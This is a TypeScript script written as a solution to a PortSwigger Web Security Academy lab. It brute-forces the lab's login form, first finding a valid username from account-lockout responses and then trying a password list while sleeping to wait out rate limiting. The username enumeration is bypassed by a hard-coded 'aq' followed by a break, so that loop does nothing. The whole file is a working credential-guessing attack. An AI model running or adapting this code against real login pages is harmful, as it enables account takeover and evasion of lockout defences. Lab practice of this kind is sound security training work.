import axios, { AxiosResponse } from "axios";
import * as fs from "fs";
// import fetch from "node-fetch";

const subdomain = "ac1a1f2d1f8185ddc01810a800ac00d2";
const loginURL = `https://${subdomain}.web-security-academy.net/login`;

const attack = async () => {
  const usernameCandidates = fs
    .readFileSync(__dirname + "/username_candidates.txt")
    .toString()
    .split("\n");

  const passwordCandidates = fs
    .readFileSync(__dirname + "/password_candidates.txt")
    .toString()
    .split("\n");

  let validUsername;

  for (let usernameCandidate of usernameCandidates) {
    validUsername = "aq";
    break;
    try {
      let response: AxiosResponse;
      for (let i = 0; i < 8; i++) {
        response = await axios.post(
          loginURL,
          `username=${usernameCandidate}&password=123`
        );
      }

      console.log(response.data);

      if (
        !response.data.includes("Invalid") ||
        response.data.includes("locked")
      ) {
        validUsername = usernameCandidate;
        console.log(response.data);
        console.log(
          "The account returning a locked warning is: ",
          validUsername
        );
      }
    } catch (e) {
      console.log(e);
      throw e;
    }
  }

  for (let passwordCandidate of passwordCandidates) {
    let response: AxiosResponse;
    let keepTrying = true;
    while (keepTrying) {
      response = await axios.post(
        loginURL,
        `username=${validUsername}&password=${passwordCandidate}`
      );
      if (!response.data.includes("attempt")) {
        keepTrying = false;
      } else {
        await sleep(1000);
      }
    }

    console.log(response.data);

    if (
      !response.data.includes("Invalid username or password.") &&
      !response.data.includes("attempt")
    ) {
      console.log(
        "Username and password is: ",
        validUsername,
        " ",
        passwordCandidate
      );
      break;
    }
  }
};

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

try {
  attack();
} catch (e) {
  console.log(e);
  throw e;
}
